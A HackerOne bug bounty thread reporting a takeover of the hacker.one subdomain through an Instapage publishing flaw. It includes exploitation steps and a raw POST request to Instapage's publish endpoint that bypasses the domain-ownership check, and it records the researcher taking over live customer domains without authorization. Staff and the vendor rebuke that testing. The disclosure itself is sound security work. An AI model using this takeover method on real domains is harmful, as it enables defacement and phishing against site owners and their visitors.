title: Hacker.One Subdomain Takeover

profile.name: HackerOne
profile.about: Vulnerability disclosure should be safe, transparent, and rewarding.

vulnerability_information:
Hello 
HackerOne Sec Team,

####Description :
> This report is about domain takeover of __hacker.one__ via __instapage 0day__ issue which i just found .



####Step To Verify : 
+ Visit : https://www.hacker.one
+ You will see some html updated by me.

####Impact : 
+ as its one of offical website of hackerone , so attacker can serve anything like login page or etc as he have complete access to main domain ! 

####Possible Fix :
+ For now just remove the cname of instapage , till i try to contact them and get complete fix .


Please let me know if any more info needed !

-------------
**Regards**
*Geekboy !*
vulnerability_information_html:
Hello
HackerOne Sec Team,

Description :

This report is about domain takeover of hacker.one via instapage 0day issue which i just found .

Step To Verify :

  • Visit : https://www.hacker.one
  • You will see some html updated by me.

Impact :

  • as its one of offical website of hackerone , so attacker can serve anything like login page or etc as he have complete access to main domain !

Possible Fix :

  • For now just remove the cname of instapage , till i try to contact them and get complete fix .

Please let me know if any more info needed !

Regards
Geekboy !

activities.message:
Hi @geekboy - thanks for bringing this to our attention!

Could you include steps to reproduce so we can try to reproduce this behavior on our end?

Thanks!
activities.markdown_message:
Hi @geekboy - thanks for bringing this to our attention!

Could you include steps to reproduce so we can try to reproduce this behavior on our end?

Thanks!

activities.message: Luckily we weren't using this service yet so we have just removed the CNAME to Instapage for now and are awaiting a fix on Instapage's side. Thank you for bringing this to our attention!
activities.markdown_message: Luckily we weren't using this service yet so we have just removed the CNAME to Instapage for now and are awaiting a fix on Instapage's side. Thank you for bringing this to our attention!

activities.message: @geekboy I invited Marius from Instapage to this report. Since we're going to discuss the issue here, can you please post your POC again?
activities.markdown_message: @geekboy I invited Marius from Instapage to this report. Since we're going to discuss the issue here, can you please post your POC again?

activities.message:
Okay sure !

Just to clear i reported this yesterday to Instapage on help@ initially and tweeted them for getting attention to report .

and as @martijn said Marius is joining here, so we going to discuss the report here only .

####What's the issue ? 
> Instapage provide Landing Page service for thr users , and they offer to use it on user own domain and for just users need to add cname entry for instapage.
but once users service get over or expired for any reason, the following message shows on that page: `This Web Page was built and hosted with Instapage,but no longer exists.` (in case of hacker.one :http://i.imgur.com/BxwVteM.jpg)
and after some testing i come to know i can __able to takeover all the domains or subdomains__ who are using instapage but no longer exists .

####How to Exploit it ?
+ Make test account at instapage.com
+ Get logged into account !
+ And add target domain from : https://app.instapage.com/account/domains
+ Make some test template from here : https://app.instapage.com/dashboard
+ Now publish the domain and select target domain !
+ Normally instapage don't allow you to do that, will give u error : __You can not publish to this domain__
+ And u can bypass that just calling the __publish endpoint directly__ .
+ Here how it looks like : 

````html
POST /ajax/builder2/publish/2340488 HTTP/1.1
Host: app.instapage.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://app.instapage.com/builder2?id=2340488
Content-Length: 31
Cookie: cookie_value
Connection: close

version=1&url=your_vulnerable_domain.com
````
+ Where __2340488__ is the template id you want to update & __url__ is your vulnerable target.
+ And success response will look like :

````html 
HTTP/1.1 200 OK
Date: Mon, 15 Aug 2016 21:23:15 GMT
Server: unknown
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: User-Agent
Access-Control-Allow-Origin: *
Content-Length: 70
Content-Type: text/html
Via: 1.1 google
Connection: close

{"error":false,"success":true,"message":"Page published.","data":null}
````
+ in case of __hacker.one__ : http://i.imgur.com/995Jxn4.jpg
+ Jo just change the URL for other targets !

####Poc video : https://youtu.be/ZjdAj3KcPco

*Note : domain used in poc used for showing poc only , i unpublished the domain just after that :)*

####What's the impact :
+ Just an simple targeted google dork shown me thousands of sites are vulnerable for this , number can be more in reality.
+ As we seen simplicity of exploitation with automation can takeover all the vulnerable domains & subdomains. 

Please let me know if additional info needed .

*Regards
Geekboy*
activities.markdown_message:
Okay sure !

Just to clear i reported this yesterday to Instapage on help@ initially and tweeted them for getting attention to report .

and as @martijn said Marius is joining here, so we going to discuss the report here only .

What's the issue ?

Instapage provide Landing Page service for thr users , and they offer to use it on user own domain and for just users need to add cname entry for instapage.
but once users service get over or expired for any reason, the following message shows on that page: This Web Page was built and hosted with Instapage,but no longer exists. (in case of hacker.one :http://i.imgur.com/BxwVteM.jpg)
and after some testing i come to know i can able to takeover all the domains or subdomains who are using instapage but no longer exists .

How to Exploit it ?

  • Make test account at instapage.com
  • Get logged into account !
  • And add target domain from : https://app.instapage.com/account/domains
  • Make some test template from here : https://app.instapage.com/dashboard
  • Now publish the domain and select target domain !
  • Normally instapage don't allow you to do that, will give u error : You can not publish to this domain
  • And u can bypass that just calling the publish endpoint directly .
  • Here how it looks like : 
POST /ajax/builder2/publish/2340488 HTTP/1.1
Host: app.instapage.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04

version=1&url=your_vulnerable_domain.com
  • Where 2340488 is the template id you want to update & url is your vulnerable target.
  • And success response will look like :
HTTP/1.1 200 OK
Date: Mon, 15 Aug 2016 21:23:15 GMT

{"error":false,"success":true,"message":"Page published.","data":null}

What's the impact :

  • Just an simple targeted google dork shown me thousands of sites are vulnerable for this , number can be more in reality.
  • As we seen simplicity of exploitation with automation can takeover all the vulnerable domains & subdomains.

Please let me know if additional info needed .

Regards
Geekboy

activities.message: Hi @geekboy - please do not use reports to ping for updates about another. That is likely only going to cause further delays in responding. We receive a lot of reports and it takes time to handle all of them, and we prioritize based on severity. Lower severity (or none applicable reports) will usually see slower response from our side, but we do get back to them. I would ask you to remain patient and not ping us out of band for updates. Thanks.
activities.markdown_message: Hi @geekboy - please do not use reports to ping for updates about another. That is likely only going to cause further delays in responding. Thanks.

activities.message: @geekboy @martijn - We have received reports from Instapage users that their domain was taken over by the account made by Geekboy. We have banned this account and I believe this might affect our future relationship and we prohibit testing exploits on our live user's domains. This should only be done in a controlled environment. Please respond.
activities.markdown_message: @geekboy @martijn - We have received reports from Instapage users that their domain was taken over by the account made by Geekboy. We have banned this account and I believe this might affect our future relationship and we prohibit testing exploits on our live user's domains. This should only be done in a controlled environment. Please respond.

activities.message:
Hello @mariuslaza , sorry to hear that !

and yes i noticed that my account got banned tonight at instapage , and regarding `taken over by the account made by Geekboy` i m not doing this randomly , for some targets i contacted them and made aware of risk & said to remove thr cname entry till fix , all i done in responsible manner to them nothing else ! 

but i will stop doing this now as you mentioned here , hope everything will be fine now !

Thank You !

activities.message:
@mariuslaza Thanks for flagging this. 

@geekboy We're glad that you reported this to us, and we're happy that you showed us the POC, but please don't go after any more Instapage customer. Instapage is aware of the issue and is doing their best to fix the issue as soon as possible. There's no reason to take over any more pages.
activities.markdown_message:
@mariuslaza Thanks for flagging this.

activities.message: @geekboy - Thank you. In the future, I would strongly recommend that you permit the vendor handle vulnerability coordination rather than attempting to do it on their behalf. Reaching out independently runs a high risk as being viewed as unauthorized access leading to misinterpreted intentions and uncomfortable conversations. The Instapage team is in the best position to respond to this issue appropriately.

activities.message:
Hi @geekboy,

We heard back from Instapage, and they have informed us the issue should be fixed. We'd appreciate if you would verify this, and then we can get this report closed out. Please make sure to only use your own accounts or authorized test accounts. We can assist with test case creation if needed.

Thanks!
activities.markdown_message:

Thanks!

activities.message:
Awesome, glad to hear!

We'll be in touch soon about whether this qualifies under our bug bounty program.
activities.markdown_message:
Awesome, glad to hear!

We'll be in touch soon about whether this qualifies under our bug bounty program.

activities.message:
Hi @geekboy,

While this is mostly a vulnerability in a third-party service (Instapage), we had not properly claimed the `www.hacker.one` address (only `hacker.one`) in the Instapage service, which made this issue possible. We had not yet begun to use this site, nor had we linked to it at all (aside from in our scope), so likelihood of somebody actually abusing this was very low. However, it's good that we found out about this issue early so we could resolve it before further use. As such, we are awarding a bounty based on possible future use.

Note that no HackerOne data was affected by this issue, as this is on a separate domain (`hacker.one` vs `hackerone.com`).

We want to reiterate for the future that it's important that you only test for security issues using your own accounts or documented test accounts/instances, as any such defacement of an active service can be considered malicious and unwanted.

Thanks for the report, and happy hacking!
activities.markdown_message:
Hi @geekboy,

While this is mostly a vulnerability in a third-party service (Instapage), we had not properly claimed the www.hacker.one address (only hacker.one) in the Instapage service, which made this issue possible. We had not yet begun to use this site, nor had we linked to it at all (aside from in our scope), so likelihood of somebody actually abusing this was very low. However, it's good that we found out about this issue early so we could resolve it before further use. As such, we are awarding a bounty based on possible future use.

Note that no HackerOne data was affected by this issue, as this is on a separate domain (hacker.one vs hackerone.com).

We want to reiterate for the future that it's important that you only test for security issues using your own accounts or documented test accounts/instances, as any such defacement of an active service can be considered malicious and unwanted.

Thanks for the report, and happy hacking!
